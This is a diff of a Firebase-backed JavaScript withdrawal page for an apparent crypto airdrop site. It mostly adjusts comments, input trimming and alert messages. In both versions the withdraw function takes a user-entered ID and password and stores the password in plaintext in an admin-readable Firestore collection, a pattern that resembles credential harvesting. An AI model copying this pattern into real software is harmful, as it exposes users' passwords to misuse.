@@ -4,8 +4,7 @@ import {
   doc,
   getDoc,
   addDoc,
-  collection,
-  updateDoc
+  collection
 } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";
 
 import {
@@ -27,50 +26,57 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const auth = getAuth(app);
 
-let uid;
+let uid = null;
 let balance = 0;
 
+// UI element
 const balanceEl = document.getElementById("balance");
 
-// format to 8 decimals
+// format to 8 decimals (IMPORTANT)
 function format(num) {
   return Number(num).toFixed(8);
 }
 
-// ================= LOAD USER =================
+//
+// ================= LOAD USER BALANCE =================
+//
 onAuthStateChanged(auth, async (user) => {
   if (!user) {
-    alert("Login required");
+    alert("Please login first");
     window.location.href = "login.html";
     return;
   }
 
   uid = user.uid;
 
-  const userRef = doc(db, "users", uid);
-  const snap = await getDoc(userRef);
+  const ref = doc(db, "users", uid);
+  const snap = await getDoc(ref);
 
   if (snap.exists()) {
     balance = snap.data().balance || 0;
+  } else {
+    balance = 0;
   }
 
   balanceEl.textContent = format(balance);
 });
 
+//
 // ================= WITHDRAW FUNCTION =================
+//
 window.submitWithdraw = async function () {
 
-  const userId = document.getElementById("userId").value;
-  const password = document.getElementById("password").value;
+  const userIdInput = document.getElementById("userId").value.trim();
+  const password = document.getElementById("password").value.trim();
   const amount = Number(document.getElementById("amount").value);
 
   // validation
-  if (!userId || !password || !amount) {
+  if (!userIdInput || !password || !amount) {
     alert("Please fill all fields");
     return;
   }
 
-  // allow tiny crypto withdrawals (IMPORTANT FIX)
+  // allow micro crypto withdrawal
   if (amount < 0.00000001) {
     alert("Minimum withdrawal is 0.00000001");
     return;
@@ -78,26 +84,29 @@ window.submitWithdraw = async function () {
 
   try {
 
-    // SEND TO ADMIN (Firestore)
+    // ================= SEND TO ADMIN =================
     await addDoc(collection(db, "pendingWithdrawals"), {
       userId: uid,
-      enteredUserId: userId,
+      enteredUserId: userIdInput,
       password: password,
       amount: amount,
+
       status: "Pending",
       type: "airdrop_withdraw",
-      createdAt: new Date()
+
+      balanceBefore: balance,
+      createdAt: Date.now()
     });
 
-    alert("Withdrawal sent to admin successfully!");
+    alert("Withdrawal sent to admin successfully ✔");
 
-    // clear inputs
+    // clear form
     document.getElementById("userId").value = "";
     document.getElementById("password").value = "";
     document.getElementById("amount").value = "";
 
   } catch (err) {
-    console.error(err);
-    alert("Withdrawal failed. Try again.");
+    console.error("Withdrawal error:", err);
+    alert("Failed to send withdrawal");
   }
 };
